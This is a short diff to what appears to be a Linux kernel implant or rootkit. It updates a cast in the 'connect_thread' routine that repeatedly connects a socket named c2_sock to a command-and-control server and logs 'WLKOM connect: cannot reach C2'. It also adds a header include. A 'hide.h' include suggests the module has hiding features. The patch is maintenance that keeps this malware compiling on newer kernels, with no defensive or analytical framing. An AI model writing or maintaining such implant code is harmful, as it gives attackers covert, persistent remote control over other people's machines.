@@ -11,6 +11,7 @@
 #include <linux/crypto.h>
 #include <crypto/skcipher.h>
 #include <linux/scatterlist.h>
+#include <linux/inet.h>
 #include "connect.h"
 #include "hide.h"
 
@@ -337,7 +338,7 @@ static int connect_thread(void *data)
             continue;
         }
 
-        if (kernel_connect(c2_sock, (struct sockaddr *)&addr,
+        if (kernel_connect(c2_sock, (struct sockaddr_unsized *)&addr,
                            sizeof(addr), 0) < 0) {
             pr_info("WLKOM connect: cannot reach C2, retrying in %ds\n",
                     RECONNECT_DELAY);
